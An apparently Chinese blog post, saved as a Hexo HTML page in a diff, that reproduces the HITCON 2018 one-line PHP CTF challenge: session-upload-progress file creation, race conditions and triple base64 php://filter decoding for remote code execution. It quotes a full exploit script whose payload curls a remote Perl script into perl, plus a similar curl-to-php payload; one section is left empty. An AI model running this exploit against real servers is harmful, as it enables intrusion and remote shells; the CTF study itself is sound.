@@ -1,0 +1,517 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"findneo.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="源码环境：This is a default installation PHP7.2 + Apache on Ubuntu 18.04 。   解读 $_GET 是一个数组，包含通过URL参数传给当前脚本的变量。如访问localhost?orange&#x3D;123&amp;foo&#x3D;bar ，则 $_GET 为 array (&#39;orange&#39; &#x3D;&gt; &#39;123&#39;,&amp;#3">
+<meta property="og:type" content="article">
+<meta property="og:title" content="one-line-php-challenge 复现">
+<meta property="og:url" content="https://findneo.github.io/181123-one-line-php-challenge/index.html">
+<meta property="og:site_name" content="闲言语">
+<meta property="og:description" content="源码环境：This is a default installation PHP7.2 + Apache on Ubuntu 18.04 。   解读 $_GET 是一个数组，包含通过URL参数传给当前脚本的变量。如访问localhost?orange&#x3D;123&amp;foo&#x3D;bar ，则 $_GET 为 array (&#39;orange&#39; &#x3D;&gt; &#39;123&#39;,&amp;#3">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://findneo.github.io/181123-one-line-php-challenge/2018-10-23_200848.png">
+<meta property="og:image" content="https://findneo.github.io/181123-one-line-php-challenge/1542959895935.png">
+<meta property="og:image" content="https://findneo.github.io/181123-one-line-php-challenge/1542960054923.png">
+<meta property="og:image" content="https://findneo.github.io/181123-one-line-php-challenge/1542968416018.png">
+<meta property="og:image" content="https://findneo.github.io/181123-one-line-php-challenge/1542969726963.png">
+<meta property="og:image" content="https://findneo.github.io/181123-one-line-php-challenge/1542969783918.png">
+<meta property="og:image" content="https://findneo.github.io/181123-one-line-php-challenge/1542969815646.png">
+<meta property="og:image" content="https://findneo.github.io/181123-one-line-php-challenge/1542969856431.png">
+<meta property="og:image" content="https://findneo.github.io/181123-one-line-php-challenge/1542964721887.png">
+<meta property="article:published_time" content="2018-11-23T00:31:07.000Z">
+<meta property="article:modified_time" content="2021-03-09T13:32:32.000Z">
+<meta property="article:author" content="findneo">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://findneo.github.io/181123-one-line-php-challenge/2018-10-23_200848.png">
+
+<link rel="canonical" href="https://findneo.github.io/181123-one-line-php-challenge/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>one-line-php-challenge 复现 | 闲言语</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?c9a19ce963f4d3d9bdc923fec3582400";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="闲言语" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">闲言语</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://findneo.github.io/181123-one-line-php-challenge/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/findneo.png">
+      <meta itemprop="name" content="findneo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="闲言语">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          one-line-php-challenge 复现
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2018-11-23 08:31:07" itemprop="dateCreated datePublished" datetime="2018-11-23T08:31:07+08:00">2018-11-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-03-09 21:32:32" itemprop="dateModified" datetime="2021-03-09T21:32:32+08:00">2021-03-09</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><p>环境：<code>This is a default installation PHP7.2 + Apache on Ubuntu 18.04</code> 。</p>
+<p><img data-src="2018-10-23_200848.png" alt="alt"> </p>
+<h1 id="解读"><a href="#解读" class="headerlink" title="解读"></a>解读</h1><ul>
+<li><code>$_GET</code> 是一个数组，包含通过URL参数传给当前脚本的变量。如访问<code>localhost?orange=123&amp;foo=bar</code> ，则 <code>$_GET</code> 为 <code>array (&#39;orange&#39; =&gt; &#39;123&#39;,&#39;foo&#39; =&gt; &#39;bar&#39;,)</code> ，<code>$_GET[&#39;orange&#39;]</code> 为<code>&#39;123&#39;</code> 。另外，<code>$_GET</code> 是超全局变量，即在全部作用域中始终可用的内置变量。</li>
+<li><code>@</code>被称为错误控制运算符（Error Control Operators）。当将其放置在一个 PHP 表达式之前，该表达式可能产生的任何错误信息都被忽略掉。例如对于内容为<code>&lt;?php $_=$_GET[&#39;orange&#39;];</code> 的PHP文件，直接访问其会报错 <code>Notice :  Undefined index: orange in...</code> ，加上 <code>@</code> 后就不会显示错误信息。</li>
+<li>赋值操作。和C语言中的情况一样，赋值表达式的值就是赋值符号右侧的操作数的值。<code>The value of an assignment expression is the value assigned</code> 。</li>
+<li><code>$_</code> 。一个普通的变量名。</li>
+<li><code>file()</code> 。把整个文件读入数组中。<ul>
+<li><code>array file ( string $filename [, int $flags = 0 [, resource $context ]] )</code>  </li>
+<li><img data-src="1542959895935.png" alt="1542959895935"></li>
+<li><img data-src="1542960054923.png" alt="1542960054923"> </li>
+</ul>
+</li>
+<li><code>string substr ( string $string , int $start [, int $length ] )</code> 。</li>
+<li>include 语句包含并运行指定文件。</li>
+<li><code>(expr1) ? (expr2) : (expr3)</code> 是一个条件运算符，和C语言类似。</li>
+<li>使用orange参数从URL传入一个文件名，如果该文件第一行的前六个字符是<code>@&lt;?php</code> ，就将它包含并运行。</li>
+<li>相关文档： <a target="_blank" rel="noopener" href="http://php.net/manual/en/language.operators.assignment.php">Assignment Operators</a> , <a target="_blank" rel="noopener" href="http://php.net/manual/en/reserved.variables.get.php">$_GET</a> , <a target="_blank" rel="noopener" href="http://php.net/manual/en/language.operators.errorcontrol.php">Error Control Operators</a> ,  <a target="_blank" rel="noopener" href="http://php.net/manual/zh/language.operators.comparison.php#language.operators.comparison.ternary">三元运算符</a> </li>
+</ul>
+<h1 id="关键点"><a href="#关键点" class="headerlink" title="关键点"></a>关键点</h1><h2 id="创建文件"><a href="#创建文件" class="headerlink" title="创建文件"></a>创建文件</h2><p><code>allow_url_include</code> 默认值是<code>off</code> ，因此无法包含远程文件。那么如果要包含本地文件，就需要已知的文件名和可控的文件内容。</p>
+<p>最主要的利用点在于：如果在上传文件的同时POST <code>PHP_SESSION_UPLOAD_PROGRESS</code> 参数，PHP就会为我们创建session，并且session文件名可以通过cookie中的PHPSESSID控制。</p>
+<p>做个实验。</p>
+<p>我的环境：<code>PHP7.2 + Apache on Kali 4.18</code> </p>
+<p><img data-src="1542968416018.png" alt="1542968416018"></p>
+<p>会发现确实如此。而且不仅如此。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -s 127.0.0.1/oneline.php -H <span class="string">&#x27;Cookie: PHPSESSID=iamnotorange&#x27;</span> -F <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS=this_is_findneo_speaking&#x27;</span> -F <span class="string">&#x27;file=@/etc/passwd&#x27;</span> 1&gt;/dev/null</span><br><span class="line">curl -s 127.0.0.1/oneline.php -H <span class="string">&#x27;Cookie: PHPSESSID=iamnotorange2&#x27;</span> -F <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS=this_is_findneo_speaking2&#x27;</span> -F <span class="string">&#x27;foobar=anystring&#x27;</span> 1&gt;/dev/null</span><br><span class="line">curl -s 127.0.0.1/oneline.php -H <span class="string">&#x27;Cookie: PHPSESSID=iamnotorange3&#x27;</span> -F <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS=this_is_findneo_speaking3&#x27;</span>  1&gt;/dev/null</span><br><span class="line">curl -s 127.0.0.1/oneline.php -H <span class="string">&#x27;Cookie: PHPSESSID=iamnotorange4&#x27;</span> -d <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS=this_is_findneo_speaking4&#x27;</span>  1&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>我执行了四次请求。第一次是使用multipart传一个文件和一个字符串，可以同时生成session文件并且控制文件名，第二次传两个字符串，只能生成文件，文件名是随机的，第三次只有一个字符串，效果同第二次，第四个直接post一个字符串，无法生成session文件。四次请求的报文形式如下。</p>
+<p><img data-src="1542969726963.png" alt="第一次"></p>
+<p><img data-src="1542969783918.png" alt="第二次"></p>
+<p><img data-src="1542969815646.png" alt="第三次"></p>
+<p><img data-src="1542969856431.png" alt="第四次"></p>
+<p>但是我们还会发现，无论怎样请求，文件内容总是为空，这是因为 <code>session.upload_progress.cleanup=on</code> ，导致文件一上传完马上被清空。这是我们可以用条件竞争或者传超大文件来保留文件内容。</p>
+<h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#loop.py</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> threadpool</span><br><span class="line"></span><br><span class="line">sessname=<span class="string">&quot;iamnotorange&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runner</span>(<span class="params">i</span>):</span></span><br><span class="line">	cmd=<span class="string">&quot;curl -s 127.0.0.1/oneline.php -H &#x27;Cookie: PHPSESSID=%s&#x27; -F &#x27;PHP_SESSION_UPLOAD_PROGRESS=this_is_findneo_speaking&#x27; -F &#x27;file=@/etc/passwd&#x27; 1&gt;/dev/null&quot;</span>%sessname</span><br><span class="line">	os.system(cmd)</span><br><span class="line">	os.system(<span class="string">&quot;xxd /var/lib/php/sessions/sess_%s &quot;</span>%sessname)</span><br><span class="line">pool=threadpool(<span class="number">30</span>)</span><br><span class="line">result=pool.map_async(runner,<span class="built_in">range</span>(<span class="number">30</span>)).get(<span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="1542964721887.png" alt="1542964721887"></p>
+<p>可以观察到，文件内容的前一部分是可控的。</p>
+<h3 id="超大文件"><a href="#超大文件" class="headerlink" title="超大文件"></a>超大文件</h3><h2 id="变换文件内容"><a href="#变换文件内容" class="headerlink" title="变换文件内容"></a>变换文件内容</h2><p>到此为止，我们实现了控制文件名和文件内容，但是文件内容的形式是固定的，即以<code>upload_progress_</code> 开头，而我们期望他是以 <code>@&lt;?php</code> 开头。于是需要变换文件内容，可以利用 <code>php://filter</code> ，比如将文件内容多次base64解码得到我们想要的字符串。</p>
+<p>base64解码的特点在于：</p>
+<ul>
+<li>可以将字符串每四个字符分一组，每组解码后变成三个字符，组与组之间互不影响。</li>
+<li>base64编码后的字符串只会包含 <code>[0-9a-z-A-Z+\=]</code> ，如果解码时遇到这些字符之外的就会被忽略，或者说，解码前会先将非法字符删除。</li>
+</ul>
+<p>所以实际上</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import base64;print base64.b64decode(&#x27;\x11\x22\x23\x24&#x27;*24+base64.b64encode(&#x27;test&#x27;))&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>的执行结果还是test。</p>
+<p>我们只要想办法让<code>upload_progress_</code> 解码后成为不合法字符从而被忽略就可以了，所以需要加一些垃圾数据。因为 <code>upload_progress_</code> 有16个字符</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="结合利用"><a href="#结合利用" class="headerlink" title="结合利用"></a>结合利用</h1><p>将诸如 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@&lt;?php &#96;curl remote.ip | php - ;?&gt;&#96;</span><br></pre></td></tr></table></figure>
+
+<p>的payload三次编码再加上填充数据后作为 <code>PHP_SESSION_UPLOAD_PROGRESS</code> 的值上传，然后利用</p>
+<p><code>php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=/var/lib/php/sessions/sess_whatever</code> 包含进来即可执行命令。可采用多线程竞争或者大文件上传保留session文件。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2018/one-line-php-challenge/exp_for_php.py</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> sample, randint</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;http://54.250.246.238/&#x27;</span></span><br><span class="line">sess_name = <span class="string">&#x27;iamorange&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;PHPSESSID=&#x27;</span> + sess_name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;@&lt;?php `curl orange.tw/w/bc.pl|perl -`;?&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    junk = <span class="string">&#x27;&#x27;</span>.join(sample(string.ascii_letters, randint(<span class="number">8</span>, <span class="number">16</span>)))</span><br><span class="line">    x = b64encode(payload + junk)</span><br><span class="line">    xx = b64encode(b64encode(payload + junk))</span><br><span class="line">    xxx = b64encode(b64encode(b64encode(payload + junk)))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;=&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> x <span class="keyword">and</span> <span class="string">&#x27;=&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> xx <span class="keyword">and</span> <span class="string">&#x27;=&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> xxx:</span><br><span class="line">        payload = xxx</span><br><span class="line">        <span class="built_in">print</span> payload</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runner1</span>(<span class="params">i</span>):</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;ZZ&#x27;</span> + payload + <span class="string">&#x27;Z&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        fp = <span class="built_in">open</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">        r = requests.post(HOST, files=&#123;<span class="string">&#x27;f&#x27;</span>: fp&#125;, data=data, headers=headers)</span><br><span class="line">        fp.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runner2</span>(<span class="params">i</span>):</span></span><br><span class="line">    filename = <span class="string">&#x27;/var/lib/php/sessions/sess_&#x27;</span> + sess_name</span><br><span class="line">    filename = <span class="string">&#x27;php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s&#x27;</span> % filename</span><br><span class="line">    <span class="comment"># print filename</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        url = <span class="string">&#x27;%s?orange=%s&#x27;</span> % (HOST, filename)</span><br><span class="line">        r = requests.get(url, headers=headers)</span><br><span class="line">        c = r.content</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">and</span> <span class="string">&#x27;orange&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> c:</span><br><span class="line">            <span class="built_in">print</span> [c]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">    runner = runner1</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    runner = runner2</span><br><span class="line"></span><br><span class="line">pool = ThreadPool(<span class="number">32</span>)</span><br><span class="line">result = pool.map_async( runner, <span class="built_in">range</span>(<span class="number">32</span>) ).get(<span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h1><ul>
+<li><a target="_blank" rel="noopener" href="http://www.wupco.cn/?p=4460">http://www.wupco.cn/?p=4460</a> </li>
+<li><a target="_blank" rel="noopener" href="https://github.com/orangetw/My-CTF-Web-Challenges#one-line-php-challenge">https://github.com/orangetw/My-CTF-Web-Challenges#one-line-php-challenge</a> </li>
+<li><a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=72681">https://bugs.php.net/bug.php?id=72681</a> </li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.png" alt="findneo 微信支付">
+        <p>微信支付</p>
+      </div>
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/181028-seccon-wp/" rel="prev" title="SECCON 2018">
+      <i class="fa fa-chevron-left"></i> SECCON 2018
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/181124-what-if-e-phi-not-coprime/" rel="next" title="如果RSA加密中的e和phi不互质">
+      如果RSA加密中的e和phi不互质 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BA%90%E7%A0%81"><span class="nav-number">1.</span> <span class="nav-text">源码</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A7%A3%E8%AF%BB"><span class="nav-number">2.</span> <span class="nav-text">解读</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E7%82%B9"><span class="nav-number">3.</span> <span class="nav-text">关键点</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E6%96%87%E4%BB%B6"><span class="nav-number">3.1.</span> <span class="nav-text">创建文件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="nav-number">3.1.1.</span> <span class="nav-text">条件竞争</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B6%85%E5%A4%A7%E6%96%87%E4%BB%B6"><span class="nav-number">3.1.2.</span> <span class="nav-text">超大文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%98%E6%8D%A2%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9"><span class="nav-number">3.2.</span> <span class="nav-text">变换文件内容</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%93%E5%90%88%E5%88%A9%E7%94%A8"><span class="nav-number">4.</span> <span class="nav-text">结合利用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E9%93%BE%E6%8E%A5"><span class="nav-number">5.</span> <span class="nav-text">相关链接</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="findneo"
+      src="/images/findneo.png">
+  <p class="site-author-name" itemprop="name">findneo</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">79</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/findneo" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;findneo" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/findneo_" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;findneo_" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">findneo</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
